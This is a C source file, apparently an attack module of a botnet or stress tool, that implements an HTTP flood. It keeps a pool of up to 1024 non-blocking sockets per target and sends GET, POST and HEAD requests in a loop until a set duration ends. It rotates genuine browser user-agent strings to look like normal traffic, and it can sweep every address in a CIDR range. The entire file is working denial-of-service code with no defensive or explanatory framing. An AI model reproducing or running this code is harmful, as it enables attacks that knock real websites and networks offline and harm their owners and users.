#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <sys/time.h>

#include "http_attack.h"

#define MAX_CONNECTIONS 1024

static const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
};
#define UA_COUNT (sizeof(user_agents) / sizeof(user_agents[0]))

static void set_socket_options(int sock) {
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
}

static const char* pick_request(attack_params *params, const char *get_tpl, const char *post_tpl, const char *head_tpl, size_t *out_len) {
    if (params->http_method == 0) {
        params->http_method = 1;
    }

    uint8_t available = params->http_method;
    int count = __builtin_popcount(available);
    int selected = rand() % count;
    uint8_t chosen = 1;

    while (selected > 0 || (available & chosen) == 0) {
        chosen <<= 1;
        if (available & chosen) selected--;
    }

    switch (chosen) {
        case 2:
            *out_len = strlen(post_tpl);
            return post_tpl;
        case 4:
            *out_len = strlen(head_tpl);
            return head_tpl;
        default:
            *out_len = strlen(get_tpl);
            return get_tpl;
    }
}

static int fill_connection_pool(int *sockets, int *active_sockets, struct sockaddr_in *addr) {
    while (*active_sockets < MAX_CONNECTIONS) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) break;

        set_socket_options(sock);

        int ret = connect(sock, (struct sockaddr*)addr, sizeof(*addr));
        if (ret < 0 && errno != EINPROGRESS) {
            close(sock);
            continue;
        }

        sockets[(*active_sockets)++] = sock;
    }
    return *active_sockets;
}

static void send_requests(int *sockets, int *active_sockets, attack_params *params,
                          const char *get_tpl, const char *post_tpl, const char *head_tpl) {
    for (int i = 0; i < *active_sockets; i++) {
        int sock = sockets[i];
        if (sock <= 0) continue;

        size_t len;
        const char *request = pick_request(params, get_tpl, post_tpl, head_tpl, &len);

        ssize_t sent = send(sock, request, len, MSG_NOSIGNAL | MSG_DONTWAIT);

        if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            close(sock);
            sockets[i] = sockets[--(*active_sockets)];
            sockets[*active_sockets] = 0;
            i--;
            continue;
        }

        char discard[1024];
        recv(sock, discard, sizeof(discard), MSG_DONTWAIT);
    }
}

static void cleanup_dead_sockets(int *sockets, int *active_sockets, struct timeval *last_cleanup) {
    struct timeval now;
    gettimeofday(&now, NULL);
    if (now.tv_sec - last_cleanup->tv_sec < 1) return;

    for (int i = 0; i < *active_sockets; i++) {
        if (sockets[i] <= 0) continue;

        char test;
        if (recv(sockets[i], &test, 1, MSG_PEEK | MSG_DONTWAIT) == 0) {
            close(sockets[i]);
            sockets[i] = sockets[--(*active_sockets)];
            sockets[*active_sockets] = 0;
            i--;
        }
    }
    *last_cleanup = now;
}

static void attack_single_target(attack_params *params, struct sockaddr_in *target,
                                  int *sockets, int *active_sockets,
                                  const char *get_tpl, const char *post_tpl, const char *head_tpl,
                                  struct timeval *last_cleanup) {
    fill_connection_pool(sockets, active_sockets, target);
    send_requests(sockets, active_sockets, params, get_tpl, post_tpl, head_tpl);
    cleanup_dead_sockets(sockets, active_sockets, last_cleanup);
}

void* http_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = params->target_addr.sin_port;
    target_addr.sin_addr = params->target_addr.sin_addr;

    const char* host = inet_ntoa(params->target_addr.sin_addr);
    const char* ua = user_agents[rand() % UA_COUNT];

    char get_template[512], post_template[512], head_template[512];

    snprintf(get_template, sizeof(get_template),
        "GET / HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Connection: keep-alive\r\n"
        "\r\n", host, ua);

    snprintf(post_template, sizeof(post_template),
        "POST / HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: keep-alive\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 16\r\n"
        "\r\n"
        "data=random_data", host, ua);

    snprintf(head_template, sizeof(head_template),
        "HEAD / HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: keep-alive\r\n"
        "\r\n", host, ua);

    int sockets[MAX_CONNECTIONS] = {0};
    int active_sockets = 0;
    struct timeval last_cleanup = {0, 0};

    srand(time(NULL) ^ getpid());
    time_t end_time = time(NULL) + params->duration;

    if (params->cidr > 0) {
        uint32_t base = ntohl(params->base_ip);
        uint32_t mask = params->cidr == 32 ? 0xFFFFFFFF : (~0U << (32 - params->cidr));
        uint32_t start = base & mask;
        uint32_t end = start | (~mask);

        struct sockaddr_in target_sub = target_addr;

        while (params->active && time(NULL) < end_time) {
            uint32_t first = (params->cidr >= 31) ? start : start + 1;
            uint32_t last  = (params->cidr == 32) ? start : end;

            for (uint32_t ip = first; ip <= last && params->active && time(NULL) < end_time; ip++) {
                target_sub.sin_addr.s_addr = htonl(ip);

                /* rotate UA per subnet IP */
                ua = user_agents[rand() % UA_COUNT];
                snprintf(get_template, sizeof(get_template),
                    "GET / HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: %s\r\n"
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    "Accept-Language: en-US,en;q=0.5\r\n"
                    "Connection: keep-alive\r\n"
                    "\r\n", inet_ntoa(target_sub.sin_addr), ua);

                attack_single_target(params, &target_sub, sockets, &active_sockets,
                                     get_template, post_template, head_template, &last_cleanup);
            }
        }
    } else {
        while (params->active && time(NULL) < end_time) {
            /* rotate UA periodically */
            if (rand() % 64 == 0) {
                ua = user_agents[rand() % UA_COUNT];
                snprintf(get_template, sizeof(get_template),
                    "GET / HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: %s\r\n"
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    "Accept-Language: en-US,en;q=0.5\r\n"
                    "Connection: keep-alive\r\n"
                    "\r\n", host, ua);
            }

            attack_single_target(params, &target_addr, sockets, &active_sockets,
                                 get_template, post_template, head_template, &last_cleanup);
        }
    }

    for (int i = 0; i < active_sockets; i++) {
        if (sockets[i] > 0) close(sockets[i]);
    }

    return NULL;
}
